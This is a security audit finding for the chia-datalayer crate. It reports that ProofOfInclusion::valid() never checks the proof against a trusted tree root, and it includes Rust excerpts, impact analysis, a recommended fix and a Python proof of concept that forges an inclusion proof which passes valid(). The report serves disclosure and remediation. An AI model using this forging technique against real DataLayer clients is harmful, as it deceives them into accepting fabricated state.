### Title
`ProofOfInclusion::valid()` Does Not Validate Against a Trusted Root Hash, Allowing Forged DataLayer Inclusion Proofs - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

`ProofOfInclusion::valid()` performs only a self-consistency check on the proof's internal hash chain. It never compares the computed root against any externally-trusted tree root. Because the struct is fully deserializable from untrusted bytes via the Python/wasm bindings, an attacker can craft a `ProofOfInclusion` that passes `valid()` while proving inclusion of an arbitrary key in an arbitrary (fabricated) tree root — i.e., forged inclusion proofs are accepted as valid.

### Finding Description

`ProofOfInclusion` is a Streamable struct exposed through Python bindings with `from_bytes()`, `from_bytes_unchecked()`, and `from_json_dict()` constructors. Its `valid()` method is:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    existing_hash == self.root_hash()  // <-- tautological
}
``` [1](#0-0) 

The `root_hash()` method returns `last.combined_hash` from the proof itself:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash   // self-reported, not externally trusted
    } else {
        self.node_hash
    }
}
``` [2](#0-1) 

After the loop completes without returning `false`, `existing_hash` equals the last `calculated_hash`, which equals the last `layer.combined_hash` (because the equality check passed). `self.root_hash()` also returns `last.combined_hash`. Therefore the final comparison `existing_hash == self.root_hash()` is **always `true`** when the loop passes — it is a tautology. `valid()` never checks the proof's claimed root against any externally-committed tree root.

The struct is fully mutable and deserializable from untrusted bytes: [3](#0-2) 

The Python binding exposes `from_bytes`, `from_bytes_unchecked`, `from_json_dict`, and `valid()` as a public API: [4](#0-3) 

### Impact Explanation

An attacker who can deliver a serialized `ProofOfInclusion` to a DataLayer client (e.g., via a peer connection or API response) can forge a proof that:

1. Claims any `node_hash` (the hash of a key-value pair that does not exist in the real tree)
2. Contains a chain of `ProofOfInclusionLayer` values where each `combined_hash` is computed correctly from the previous hash and an arbitrary `other_hash`
3. Passes `valid()` returning `true`

The forged proof's `root_hash()` will be whatever the attacker chose — it is never compared against the actual committed tree root. Any DataLayer client that calls `proof.valid()` as the sole verification step (the natural API usage, given the method name) will incorrectly accept the forged proof as proving inclusion of a key that does not exist in the real tree. This lets untrusted input prove invalid DataLayer state, matching the allowed High impact: **DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion and lets untrusted input prove invalid state**.

### Likelihood Explanation

The API design strongly encourages misuse. The method is named `valid()` and returns `bool`, suggesting it is a complete validity check. The Python type stub provides no documentation that the caller must additionally verify `proof.root_hash() == trusted_root`. The `root_hash()` method is exposed separately, but nothing in the API surface signals that calling it and comparing against a trusted value is mandatory. Any DataLayer peer-to-peer proof exchange that relies on `valid()` alone is exploitable by any peer.

### Recommendation

`valid()` must accept a trusted root hash parameter and compare against it:

```rust
pub fn valid_against_root(&self, trusted_root: &Hash) -> bool {
    // ... existing chain check ...
    existing_hash == *trusted_root  // compare against externally-trusted root
}
```

Alternatively, rename the current `valid()` to `is_internally_consistent()` to make clear it does not verify against a trusted root, and add a separate `verify(trusted_root: &Hash) -> bool` method that performs the complete check. Update all Python bindings accordingly and add documentation that `valid()` alone is insufficient for proof verification against a known tree state.

### Proof of Concept

```python
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer
import hashlib

# Attacker wants to forge a proof that some arbitrary node_hash is "included"
# in a tree, without knowing the real tree root.

# Step 1: choose an arbitrary node_hash (e.g., hash of a fake key-value pair)
fake_node_hash = bytes([0xAB] * 32)

# Step 2: build a single-layer proof with an arbitrary other_hash
other_hash = bytes([0xCD] * 32)
# Compute combined_hash as the real calculate_internal_hash would
# (left side: sha256(b"\x02" + fake_node_hash + other_hash))
combined = hashlib.sha256(b"\x02" + fake_node_hash + other_hash).digest()

layer = ProofOfInclusionLayer(
    other_hash_side=0,   # left
    other_hash=other_hash,
    combined_hash=combined,
)

forged_proof = ProofOfInclusion(node_hash=fake_node_hash, layers=[layer])

# Step 3: valid() returns True for a completely fabricated proof
assert forged_proof.valid(), "Forged proof passes valid()!"

# The claimed root is whatever the attacker chose — never checked against reality
print("Forged root:", forged_proof.root_hash().hex())
# A real verifier using only proof.valid() would accept this as proving
# fake_node_hash is included in the tree with root = forged_proof.root_hash()
